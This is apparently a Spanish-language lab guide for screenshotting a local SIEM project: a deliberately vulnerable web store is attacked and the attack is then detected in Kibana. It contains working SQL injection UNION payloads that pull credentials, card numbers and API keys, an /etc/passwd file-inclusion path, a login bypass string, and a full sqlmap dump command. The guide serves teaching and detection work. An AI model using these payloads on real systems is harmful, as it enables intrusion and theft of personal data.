# Capítulo 6 — Guía paso a paso para capturas de pantalla

Esta guía te lleva, captura por captura, desde la web sana hasta el ataque y su
detección en el SOC. Sigue el orden: cada bloque indica **qué ejecutar**, **qué
verás** y **📸 qué capturar**.

> Antes de empezar: `make soc` (deja el lab listo). Ten abiertas dos cosas:
> el **navegador** y una **terminal**.

---

## PARTE A — La aplicación web (el objetivo "sano")

Abre en el navegador: **http://localhost:8080**

| Paso | URL | 📸 Captura |
|------|-----|-----------|
| A.1 | `http://localhost:8080` | Portada "ACME Store" con el catálogo de productos. |
| A.2 | `http://localhost:8080/product.php?id=1` | Detalle de un producto + la consulta SQL mostrada abajo (`SELECT ... WHERE id = 1`). |
| A.3 | `http://localhost:8080/view.php?page=home.html` | La página cargada vía el parámetro `page`. |
| A.4 | `http://localhost:8080/login.php` | El formulario de login de administración. |

> 💡 La captura A.2 es clave: muestra la consulta SQL con el `id` sin sanitizar,
> que es **el origen de la vulnerabilidad**.

---

## PARTE B — Demostrar la vulnerabilidad desde el NAVEGADOR

Estas dan las mejores capturas porque el resultado se ve en pantalla.

### B.1 — Confirmar la inyección SQL (error)
```
http://localhost:8080/product.php?id=1'
```
📸 **Captura:** el mensaje `SQL error: ... near '''` → prueba de que el
parámetro es inyectable.

### B.2 — Exfiltrar credenciales del backend (UNION)
```
http://localhost:8080/product.php?id=-1 UNION SELECT id,username,password,role FROM users-- -
```
📸 **Captura:** la fila con `admin` / `S3cr3t_FlaG_db_2026`. **El robo de
credenciales en pantalla.**

### B.3 — Exfiltrar datos personales de clientes (PII)
```
http://localhost:8080/product.php?id=-1 UNION SELECT full_name,email,credit_card,national_id FROM customers-- -
```
📸 **Captura:** los 7 clientes con nombre, email, **número de tarjeta** y DNI.
**La fuga de datos sensibles** — la captura más impactante para el informe.

### B.4 — Robar las API keys
```
http://localhost:8080/product.php?id=-1 UNION SELECT service,api_key,NULL,NULL FROM api_keys-- -
```
📸 **Captura:** las claves de `stripe`, `aws_s3`, `sendgrid`.

### B.5 — Local File Inclusion (leer ficheros del servidor)
```
http://localhost:8080/view.php?page=../../../../etc/passwd
```
📸 **Captura:** el contenido de `/etc/passwd` del servidor.

### B.6 — Bypass de login por SQLi
En `http://localhost:8080/login.php` introduce:
- Usuario: `admin'-- -`
- Clave: `loquesea`

📸 **Captura:** el mensaje `✔ Autenticado como admin` sin saber la contraseña.

---

## PARTE C — El ataque automatizado (3 fases) desde la attacker box

Abre una terminal y entra en la caja atacante:
```bash
cd ~/Downloads/siem-attack-lab
docker compose exec attacker bash
```

### C.1 — FASE 1: Reconocimiento
```bash
nmap -sV web
whatweb -a 3 http://web
gobuster dir -u http://web -w /usr/share/wordlists/dirb/common.txt -x php,html
```
📸 **Captura:** la salida de `nmap` (puerto 80, Apache) y de `gobuster`
(rutas encontradas / ráfaga de 404).

### C.2 — FASE 2: Explotación con sqlmap (exfiltración COMPLETA)
```bash
sqlmap -u "http://web/product.php?id=1" --batch --dbms=mysql -D appdb --dump-all --exclude-sysdbs
```
📸 **Captura:** las tablas volcadas en formato ASCII — sobre todo `customers`
(con las tarjetas) y `users` (con `S3cr3t_FlaG_db_2026`).

### C.3 — Todo de una vez (script)
```bash
exit                 # salir de la attacker box
make attack          # corre las 3 fases completas
```
📸 **Captura:** el resumen de fases en la terminal.

---

## PARTE D — Los logs CRUDOS (lo que ve el admin sin SIEM)

```bash
docker compose exec web tail -n 25 /var/log/apache2/access.log
```
📸 **Captura:** las líneas crudas con el User-Agent `sqlmap/...` y las URLs con
`UNION SELECT`. Sirve para contrastar con la vista limpia de Kibana.

---

## PARTE E — Kibana: el SOC en acción

Abre **http://localhost:5601**. (Si es la primera vez, espera a que cargue.)

### E.1 — Discover (eventos estructurados)
Menú ☰ → **Analytics → Discover**. Arriba a la izquierda selecciona el data
view **`weblogs-*`**. Pon el rango de tiempo en **"Last 1 hour"** (arriba dcha).

📸 **Captura E.1:** la lista de eventos. Añade columnas `clientip`, `request`,
`response`, `agent`, `tags` (botón ⊕ al pasar sobre cada campo a la izquierda).

### E.2 — Filtrar el ataque (barra de búsqueda KQL)
Escribe en la barra de búsqueda y pulsa Enter, una por captura:
```
tags : "sqli_pattern"
tags : "scanner_ua"
tags : "lfi_pattern"
response : 404
```
📸 **Captura E.2:** Discover filtrado por `tags : "sqli_pattern"` mostrando las
peticiones de inyección.

### E.3 — Saved searches del analista
En Discover, botón **Open** (arriba) → elige `SOC — Intentos de SQL Injection`,
`SOC — Escáneres detectados`, etc.

📸 **Captura E.3:** una saved search abierta.

### E.4 — EL DASHBOARD (la captura estrella)
Menú ☰ → **Analytics → Dashboard** → abre **"SOC — Web Attack Monitoring"**.
Ajusta el tiempo a "Last 1 hour".

Verás 5 paneles:
1. Códigos de estado HTTP en el tiempo (barras)
2. Top IPs de origen (atacantes)
3. User-Agents sospechosos
4. Intentos de SQL Injection
5. Tráfico sospechoso (todo)

📸 **Captura E.4:** el dashboard completo. **La imagen principal del informe.**

### E.5 — Las reglas de detección
Menú ☰ → **Management → Stack Management → Alerts and Insights → Rules**.

📸 **Captura E.5:** la lista de 7 reglas en estado **Active / OK** con su última
ejecución.

### E.6 — El feed de alertas del SOC
Vuelve a **Discover** → data view **`soc-alerts`**.

📸 **Captura E.6:** las alertas generadas (`SQLi attempt detected` CRITICAL,
`Scanner detected`, etc.) con su `severity` y `count`.

> Alternativa en terminal: `make alerts` (tabla resumida, también capturable).

---

## Tabla resumen de capturas para el informe

| # | Captura | Demuestra |
|---|---------|-----------|
| A.2 | Consulta SQL con `id` sin sanitizar | Causa raíz |
| B.2 | Credenciales `admin` exfiltradas | Robo de credenciales |
| B.3 | Clientes con tarjetas (PII) | **Fuga de datos** |
| B.5 | `/etc/passwd` leído | LFI |
| C.2 | sqlmap volcando la BD completa | Explotación automatizada |
| D | Log crudo de Apache | Antes (sin SIEM) |
| E.4 | Dashboard de Kibana | Después (con SIEM) |
| E.5 | Reglas activas | Detección automática |
| E.6 | Feed de alertas | Respuesta del SOC |

La pareja **D → E.4** (log crudo vs. dashboard) es la comparación central del
proyecto (ver `docs/03`).

---

## Consejos de captura

- **Pantalla limpia:** usa el modo incógnito del navegador para que no salgan
  marcadores/extensiones.
- **Resalta:** en las capturas de exfiltración, rodea con un recuadro rojo la
  tarjeta o la credencial robada.
- **Marca de tiempo:** deja visible el reloj/fecha de Kibana para evidenciar el
  "tiempo real".
- **Secuencia:** captura en este orden (A→E) para contar la historia: web sana →
  ataque → rastro en logs → detección en el SOC.
- **Datos ficticios:** recuerda anotar en el informe que las tarjetas/DNIs son
  de prueba (no son datos reales).
